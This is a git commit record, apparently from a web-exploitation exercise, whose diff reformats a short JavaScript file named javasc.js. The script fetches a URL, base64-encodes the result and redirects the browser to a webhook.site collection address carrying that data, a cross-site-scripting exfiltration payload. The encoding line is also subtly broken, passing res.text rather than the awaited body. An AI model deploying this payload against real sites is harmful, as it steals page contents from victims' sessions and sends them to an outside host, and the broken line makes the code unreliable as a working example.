febcf7ae91840fcb49aba118eb0a79e2c6d4128b
Xiamong <qw050325@naver.com>
2024-10-10 19:23:56 +0900

    Update javasc.js

--- javasc.js
+++ javasc.js
@@ -3,7 +3,8 @@ fetch(url, {
             method: "GET",
         })
             .then( (res) => { 
-              let a = btoa(res.text);
-              location.href='https://webhook.site/ab7fa65c-51ba-447e-b7e3-8a92e22c3571?'+a;
-            }
+                          let a = btoa(res.text);
+                          location.href='https://webhook.site/ab7fa65c-51ba-447e-b7e3-8a92e22c3571?'+a;
+                        }
+                  )
                   
